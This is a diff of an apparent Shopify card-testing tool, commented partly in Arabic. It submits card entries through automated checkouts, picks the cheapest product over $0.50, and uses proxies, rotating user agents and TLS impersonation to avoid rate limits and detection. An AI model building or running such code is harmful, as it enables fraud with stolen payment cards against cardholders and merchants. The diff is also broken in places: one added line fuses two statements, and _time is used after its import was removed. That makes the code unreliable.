@@ -36,6 +36,11 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
 ]
 
+# ===== متغيرات الكاش للـ 429 =====
+_site_429_cache = {}
+_site_429_cache_lock = threading.Lock()
+_SITE_429_TTL = 1800  # 30 دقيقة
+
 # ──────────────────────── Enums / Result types ───────────────────────
 
 class CheckStatus(Enum):
@@ -319,146 +324,51 @@ def to_float(v: Any) -> Tuple[float, bool]:
                 pass
     return 0, False
 
-# ===== استبدل الدالة دي بالكامل =====
+# ===== دالة البحث عن المنتج الرئيسية =====
 
-async def find_cheapest_product(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
+def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50) -> Tuple[str, str, str, str]:
     """
     تدور على منتج رخيص في الموقع من غير ما تجيب 429
     """
-    # ===== 1. جرب تجيب منتج من الكاش الأول =====
-    from auto import _product_cache, _product_cache_lock, _PRODUCT_CACHE_TTL
-    import time as _time
-    
-    now = _time.time()
-    with _product_cache_lock:
-        cached = _product_cache.get(shop_url)
-        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
-            return cached[:-1]
-    
-    # ===== 2. طريقة 1: جرب تجيب من sitemap =====
+    # ===== 1. جرب تجيب من /collections/all (أسرع طريقة) =====
     try:
-        result = await _find_product_from_sitemap(client, shop_url, min_price)
+        result = _find_product_from_collections(client, shop_url, min_price)
         if result:
-            with _product_cache_lock:
-                _product_cache[shop_url] = (*result, now)
             return result
     except:
         pass
     
-    # ===== 3. طريقة 2: جرب تجيب من /collections/all =====
+    # ===== 2. جرب تجيب من /search =====
     try:
-        result = await _find_product_from_collections(client, shop_url, min_price)
+        result = _find_product_from_search(client, shop_url, min_price)
         if result:
-            with _product_cache_lock:
-                _product_cache[shop_url] = (*result, now)
             return result
     except:
         pass
     
-    # ===== 4. طريقة 3: جرب تجيب من /search =====
+    # ===== 3. جرب تجيب من products.json (آخر حل) =====
     try:
-        result = await _find_product_from_search(client, shop_url, min_price)
+        result = _find_product_from_products_json(client, shop_url, min_price)
         if result:
-            with _product_cache_lock:
-                _product_cache[shop_url] = (*result, now)
-            return result
-    except:
-        pass
-    
-    # ===== 5. طريقة 4: جرب تدور في products.json بس بحد أقصى =====
-    try:
-        result = await _find_product_from_products_json(client, shop_url, min_price)
-        if result:
-            with _product_cache_lock:
-                _product_cache[shop_url] = (*result, now)
             return result
     except Exception as e:
         if "429" in str(e):
-            # سجل ان السايت جاب 429
             with _site_429_cache_lock:
                 _site_429_cache[shop_url] = _time.time()
         raise e
     
     raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")
 
+# ===== دوال مساعدة للبحث عن المنتج =====
 
-async def _find_product_from_sitemap(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
-    """جيب المنتج من sitemap.xml"""
-    try:
-        # جيب sitemap
-        resp = await client.get(f"{shop_url}/sitemap.xml")
-        if resp.status_code != 200:
-            return None
-        
-        # دور على sitemap المنتجات
-        import xml.etree.ElementTree as ET
-        try:
-            root = ET.fromstring(resp.text)
-        except:
-            return None
-        
-        # جيب كل الروابط
-        ns = {'sitemap': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
-        urls = []
-        for loc in root.findall('.//sitemap:loc', ns):
-            url = loc.text
-            if '/products/' in url:
-                urls.append(url)
-        
-        if not urls:
-            return None
-        
-        # جرب أول 5 منتجات
-        for product_url in urls[:5]:
-            try:
-                # جيب صفحة المنتج
-                resp = await client.get(product_url)
-                if resp.status_code != 200:
-                    continue
-                
-                # استخرج الـ variant ID من الصفحة
-                html = resp.text
-                
-                # دور على الـ variant ID
-                variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html)
-                if not variant_match:
-                    continue
-                
-                variant_id = variant_match.group(1)
-                
-                # دور على السعر
-                price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html)
-                if price_match:
-                    price = float(price_match.group(1))
-                    if price >= min_price:
-                        # جيب product_id
-                        product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html)
-                        product_id = product_match.group(1) if product_match else ""
-                        
-                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html)
-                        title = title_match.group(1) if title_match else "Product"
-                        
-                        return title, product_id, variant_id, str(price)
-            except:
-                continue
-        
-        return None
-    except:
-        return None
-
-
-async def _find_product_from_collections(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
+def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: float = 0.50):
     """جيب المنتج من /collections/all"""
     try:
-        # جيب الصفحة
-        resp = await client.get(f"{shop_url}/collections/all")
+        resp = client.get(f"{shop_url}/collections/all")
         if resp.status_code != 200:
             return None
         
         html = resp.text
-        
-        # دور على أي منتج في الصفحة
-        # دور على الرابط
         product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html)
         
         if not product_links:
@@ -469,21 +379,18 @@ async def _find_product_from_collections(client: AsyncTLSClient, shop_url: str, 
                 if not link.startswith('http'):
                     link = shop_url + link
                 
-                # جيب صفحة المنتج
-                resp = await client.get(link)
+                resp = client.get(link)
                 if resp.status_code != 200:
                     continue
                 
                 html = resp.text
                 
-                # استخرج الـ variant ID
                 variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html)
                 if not variant_match:
                     continue
                 
                 variant_id = variant_match.group(1)
                 
-                # دور على السعر
                 price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html)
                 if price_match:
                     price = float(price_match.group(1))
@@ -502,18 +409,14 @@ async def _find_product_from_collections(client: AsyncTLSClient, shop_url: str, 
     except:
         return None
 
-
-async def _find_product_from_search(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
+def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float = 0.50):
     """جيب المنتج من /search"""
     try:
-        # جيب الصفحة
-        resp = await client.get(f"{shop_url}/search?q=*")
+        resp = client.get(f"{shop_url}/search?q=*")
         if resp.status_code != 200:
             return None
         
         html = resp.text
-        
-        # دور على أي منتج
         product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html)
         
         if not product_links:
@@ -524,7 +427,7 @@ async def _find_product_from_search(client: AsyncTLSClient, shop_url: str, min_p
                 if not link.startswith('http'):
                     link = shop_url + link
                 
-                resp = await client.get(link)
+                resp = client.get(link)
                 if resp.status_code != 200:
                     continue
                 
@@ -554,14 +457,16 @@ async def _find_product_from_search(client: AsyncTLSClient, shop_url: str, min_p
     except:
         return None
 
-
-async def _find_product_from_products_json(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
+def _find_product_from_products_json(client: TLSClient, shop_url: str, min_price: float = 0.50):
     """جيب المنتج من products.json (آخر حل)"""
     best_price = float('inf')
-    product_title = product_id = variant_id = price_str = ""
+    product_title = ""
+    product_id = ""
+    variant_id = ""
+    price_str = ""
     
     # ===== جيب صفحة واحدة بس بحد 5 منتجات =====
-    resp = await client.get(f"{shop_url}/products.json?limit=5&page=1")
+    resp = client.get(f"{shop_url}/products.json?limit=5&page=1")
     
     if resp.status_code == 429:
         raise Exception("GET products.json returned 429")
@@ -870,8 +775,6 @@ def extract_total_from_rejected(submit_json: str) -> str:
         return ""
 
 def extract_receipt_id(submit_body: str) -> str:
-    # Match any Shopify receipt GID (ProcessedReceipt, ProcessingReceipt, etc.)
-    # Receipt IDs can be numeric or hex hashes
     match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
     return match.group(1) if match else ""
 
@@ -884,18 +787,6 @@ def extract_payment_method_id(proposal_body: str) -> str:
     return match.group(1) if match else ""
 
 def extract_payment_gateways(proposal_body: str) -> list[dict]:
-    """Extract payment gateways from Shopify checkout negotiate/proposal JSON response.
-
-    Pass the raw response body from send_proposal / send_proposal2 / send_proposal3
-    (after address is filled — payment lines are populated on later proposals).
-
-    JSON path:
-      data.session.negotiate.result.sellerProposal.payment.availablePaymentLines[]
-        .paymentMethod
-
-    Card processor entries use __typename == "PaymentProvider".
-    Wallets (Shop Pay, Apple Pay, etc.) are separate lines in the same array.
-    """
     try:
         seller = (json.loads(proposal_body)
                       .get("data", {})
@@ -964,7 +855,6 @@ def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
     return "UNKNOWN"
 
 def detect_shipping_restriction(proposal_body: str) -> bool:
-    """Return True if the proposal response indicates this address cannot receive shipping."""
     restriction_signals = [
         "SHIPPING_ADDRESS_UNDELIVERABLE",
         "no_delivery_options_available",
@@ -982,7 +872,6 @@ def patch_payload(payload: str, currency: str, country: str) -> str:
         payload = payload.replace('"currencyCode": "USD"',        f'"currencyCode": "{currency}"')
         payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
     if country != "US":
-        # Only patch buyerIdentity countryCode — leave billing/shipping address countryCode alone
         payload = payload.replace(
             '"presentmentCurrency": "USD",\n      "countryCode": "US"',
             f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"'
@@ -1035,7 +924,6 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
         "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
 
-    # Use curl_cffi with impersonation — consistent with TLSClient
     with Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
@@ -2411,9 +2299,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 total_amount = extract_running_total(final_proposal_body)
             if not total_amount:
                 raise Exception("Step 10 failed: could not extract total amount")
-            result.amount = total_amount
-
-            attempt_token = generate_attempt_token(checkout_token)
+            result.amount = total_amount            attempt_token = generate_attempt_token(checkout_token)
             
             current_tax    = extract_tax_amount(final_proposal_body)
             current_total  = total_amount
